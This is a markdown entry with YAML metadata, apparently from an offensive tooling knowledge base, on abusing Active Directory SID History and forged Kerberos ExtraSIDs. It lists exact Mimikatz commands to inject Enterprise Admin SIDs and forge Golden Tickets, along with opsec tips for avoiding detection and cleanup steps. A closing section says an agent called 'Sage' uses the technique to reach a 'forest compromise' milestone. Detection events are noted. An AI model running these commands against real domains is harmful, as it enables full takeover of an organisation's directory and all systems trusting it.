---
name: SID History Abuse
category: trust-abuse
subcategories: [sid-history, forest-trust, privilege-escalation, domain-escalation]
tradecraft_tags: [sid-history, forest-trust, domain-trust, escalation, technique]
mitre_attack:
  - id: T1134.005
    name: Access Token Manipulation — SID-History Injection
source:
  url: https://adsecurity.org/?p=1772
  license: none
  maintained: false
binary_type: none
binary_filename: ""
supported_os: [windows]
architecture: [x64]
privilege_required: domain-admin
network_required: true
detection_signal: |
  SID History injection into a user account generates Event 4765 (SID History added).
  Cross-forest authentication with SID History triggers Event 4724 / 4674 (suspicious
  privilege claims). MDI has detection for SID History abuse and SID filtering bypass.
  Replication events (if injecting via NTDS manipulation) are also logged.
usage_examples:
  - description: Inject DA SID into a child domain user's SID History (Mimikatz, DA required)
    args: "mimikatz misc::addsid CHILD\\attacker PARENT\\\"Enterprise Admins\""
  - description: "Cross-forest SID History: inject target domain's privileged SID"
    args: "mimikatz kerberos::golden /user:attacker /domain:child.corp.local /sid:S-1-5-21-CHILD-... /sids:S-1-5-21-PARENT-519 /krbtgt:<krbtgt-hash> /ptt"
  - description: Check existing SID History on an account
    args: "Get-DomainUser attacker -Properties SIDHistory"
opsec_notes: |
  SID History injection via Mimikatz requires Domain Admin in the target domain. The
  Golden Ticket approach (adding ExtraSIDs to a forged ticket) is more commonly used
  for cross-domain escalation — it achieves the same effect without modifying AD objects.
  SID Filtering (quarantine) on forest trusts blocks SID History across the trust; check
  whether SID Filtering is enforced before attempting cross-forest abuse.
gotchas: |
  SID History added to accounts is a persistent AD object modification — it doesn't
  disappear when you leave. Clean up by removing the injected SID from the user's
  SIDHistory attribute. Golden Ticket / Extra SID approach (Rubeus/Mimikatz) is
  preferred over direct SID History modification because it doesn't modify AD objects.
  Check SID Filtering status: `netdom trust PARENT /domain:CHILD /quarantine` — if
  quarantine is enabled, SID History is filtered on trust boundary.
related_ttps: [mimikatz, rubeus, sharphound, bloodhound-ingest]
alternatives: [golden-ticket-extrasids, forest-trust-ticket-forgery]
common_args: {}
last_updated: 2026-05-29
---

# SID History Abuse

A technique that exploits the Windows `sIDHistory` attribute or forged Kerberos ExtraSIDs
to claim membership in privileged groups across domain or forest trust boundaries.
An attacker who compromises a child domain and holds the krbtgt hash can forge a
Golden Ticket with ExtraSIDs claiming Enterprise Admin membership in the parent forest —
bypassing the trust boundary.

## The Attack Chains

### Chain 1: ExtraSIDs Golden Ticket (preferred, no AD modification)
```
Prerequisite: krbtgt hash of child domain

1. Obtain parent domain's Enterprise Admin SID: S-1-5-21-PARENT-519
2. Forge Golden Ticket with ExtraSIDs:
   Mimikatz kerberos::golden /user:administrator /domain:child.corp.local
     /sid:S-1-5-21-CHILD-... /sids:S-1-5-21-PARENT-519
     /krbtgt:<krbtgt-hash> /ptt
3. Access parent domain resources as Enterprise Admin
```

### Chain 2: Direct SID History injection (persistent but noisy)
```
Prerequisite: DA in target domain, LDAP access to DC

1. Inject privileged SID into user's sIDHistory:
   Mimikatz misc::addsid CHILD\attacker PARENT\"Enterprise Admins"
2. User now has EA claims in their PAC when authenticating across trust
```

## Typical use cases
- Escalate from child domain compromise to parent domain Enterprise Admin
- Abuse misconfigured forest trusts without SID Filtering
- Cross-domain privilege escalation via trust boundary exploitation

## How Sage uses this
SharpHound's trust data in BloodHound identifies cross-forest/cross-domain attack paths.
When Sage holds DA in a child domain, the ExtraSIDs Golden Ticket path provides the
chain to parent domain compromise. This is the "forest compromise" milestone.

## SID Filtering check

If SID Filtering (quarantine) is enforced, ExtraSIDs/SIDHistory claims are stripped
at the trust boundary. Check:
```
netdom trust PARENT /domain:CHILD /quarantine
```
If quarantine is active, this technique fails. Look for alternative cross-forest paths
(foreign group memberships, trust account abuse).
